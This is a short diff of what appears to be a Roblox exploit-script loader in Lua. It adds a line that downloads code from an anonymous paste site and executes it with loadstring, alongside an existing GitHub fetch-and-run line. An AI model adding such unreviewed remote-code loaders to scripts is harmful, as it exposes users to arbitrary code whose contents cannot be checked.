@@ -13,6 +13,7 @@ if old then old:Destroy() end
 -- ⚡ Chạy script chính trước
 pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptjame/trybb/refs/heads/main/tryV3.lua"))()
+        loadstring(game:HttpGet("https://paste.debian.net/plainh/1b143a24/", true))()
 end)
 
 -- GUI chính
